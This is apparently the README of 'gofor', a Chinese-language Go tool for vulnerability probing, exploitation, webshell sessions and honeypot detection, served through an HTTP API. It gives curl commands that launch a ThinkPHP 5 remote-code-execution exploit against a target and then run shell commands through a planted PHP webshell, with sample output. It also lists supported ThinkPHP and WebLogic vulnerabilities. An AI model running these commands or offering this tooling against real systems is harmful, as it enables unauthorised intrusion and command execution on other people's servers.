# gofor
一款集漏洞探测、攻击，Session会话，蜜罐识别等功能于一身的软件，基于go-micro微服务框架并对外提供统一HTTP API网关接口服务

## HTTP API Gateway
```shell
./api-srv
```

## Service Install(Optional)
**Exploit**
```
./srv-exploit
```
**Webshell**
```webshell
./srv-webshell
```

# Example
[*] ThinkPHP5.0.20 RCE 攻击例子
```shell
curl -H "Content-Type:application/json;charset=utf-8" -X POST -d '{"target":"http://172.31.50.248:8080","cve":"VUL-2021-04271"}' http://172.31.50.249:8888/exploit/ExploitServiceExt/ExploitWithAttack
```
`{"cve":"VUL-2021-0427","tunnel":"172.31.50.249:37461"}`

[*] php webshell调用例子
```shell
curl -H "Content-Type:application/json;charset=utf-8" -X POST -d '{"target":"http://172.31.50.249:37461/ant.php","language":"php","cmd":"ls"}' http://172.31.50.249:8888/webshell/WebshellServiceExt/RunCmdWithOutput
```
`{"output":"ant.php\nfavicon.ico\nindex.php\nproxy.php\nrobots.txt\nrouter.php\nshell.php\nstatic\ntest.php\n"}`


# 当前支持漏洞列表
| id | 漏洞名 |
|--|--|
| VUL-2021-04271  | Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability |
| VUL-2021-04272  | ThinkPHP5 5.0.23 Remote Code Execution Vulnerability |
| CVE-2017-10271  | Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞 |
